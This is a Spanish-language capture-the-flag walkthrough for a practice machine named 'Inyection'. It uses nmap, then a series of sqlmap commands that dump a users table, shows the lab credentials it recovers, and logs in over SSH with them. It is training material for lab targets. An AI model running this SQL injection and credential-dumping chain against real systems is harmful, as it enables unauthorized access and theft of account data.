# primeros pasos

Maquina: **Inyection**

Dificultad: **muy facil**

Temas a tratar: _SQLMAP_ / _Pentesting web_ / _hacking web_ / _intrucion ssh_

Como primer paso realizaremos un escaneo de nmap de la siguiente forma:

```
 sudo nmap -p- -sCV --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

![Pingufoto1](https://github.com/user-attachments/assets/2ec2a564-2225-4a6d-a814-ad3e3e1d2bbb)

Gracias a este escaneo podemos descubrir que la maquina tiene abiertos los puertos **80** y **22**.
Asi que con eso ahora iremos a la web escribiremos en el buscador la ip de la maquina victima: ```172.17.0.2```
de esta forma veremos que hay en el puerto 80 de la maquina...

![pingu2](https://github.com/user-attachments/assets/305872f5-d1a1-4185-b3e4-c5eebf7448e3)
Es una web, ya he realizado el escaneo con **gobuster** y **wfuzz** y te adelanto que no hay nada ahi ni en el codigo fuente
entonces utilizaremos ```sqlmap``` para conseguir estas credenciales en su base de datos.

Aqui les dejo el comando que utilizaremos:

```
sqlmap --url http://172.17.0.2/ --dbs --batch --forms

```

con este escaneo de sqlmap estamos buscando bases de datos por eso el parametro ```--dbs``` y gracias a esto encontramos 5 bases de datos aqui debajo te las dejo:

![pingu3](https://github.com/user-attachments/assets/481f3219-9cd1-43b1-aeca-64b881325df8)

de las 5 en esta situacion solo nos interesa la que se llama **register** ya que por su nombre nos podemos imaginas que ahi dentro estan los usuarios registrados de la web.
entonces ahora usaremos el mismo comando pero con algunas diferencias ahora que ya tenemos identificada una base de datos.

```
sqlmap --url http://172.17.0.2/ -D register --tables --batch --forms

```

Con este comando ahora estamos buscando ``` tablas```
aqui la imagen

![pengu4](https://github.com/user-attachments/assets/0424c1bf-93f3-4fd1-8060-ffa5f06b2756)

y como podras ver hemos encontradp una tabla llamada users esto se pone bueno. ahora insertaremos el siguiente comando

```
sqlmap --url http://172.17.0.2/ -D register -T users --columns --batch --forms

```
ahora estamos buscando ```columnas``` por eso el comando ```---columns```

![pengu5](https://github.com/user-attachments/assets/bec7e75d-0a3c-481c-9ab2-6e3bc2b3ebf8)

Bien hecho has encontrado 2 columnas ```username``` y ```passwd```

ahora buscaremos los contenidos de estas columnas con el siguiente comando

```
sqlmap --url http://172.17.0.2/ -D register -T users -C username,passwd --batch --forms

```

Y aqui esta el resultado de tu arduo trabajo

![pingu6](https://github.com/user-attachments/assets/8d3dfff1-6bda-461b-b300-49fcd4dcc4a3)

has encontrado las credenciales! Eres bueno/a en esto!

estas son username ```dylan``` y passwd ```KJSDFG789FGSDF78```

Ahora volveremos  a la web a probar estas credenciales en la web.

![pengu7](https://github.com/user-attachments/assets/f521f5a3-e2f5-451c-975e-3dcaec290692)

y si efectivamente estas credenciales funcionan enconces como en la web no hay nada mas que ese mensaje vamos a ver si estas mismas credenciales sirven para acceder a la maquina via ssh 

comando:

```
ssh dylan@172.17.0.2

```

luego de introducir ese comando nos pedira la passwd de dylan y ahi introduciremos la passwd que obtuvimos antes

![Screenshot_2024-07-29_10-09-20](https://github.com/user-attachments/assets/e2bc6d5e-9438-4415-a104-89d1d57c1c69)

y efectivamente coinciden y logramos entrar!

Felicidades completaste la maquina Inyection y gracias por hacerlo utilizando esta ayuda, se que llegaras lejos animos!.
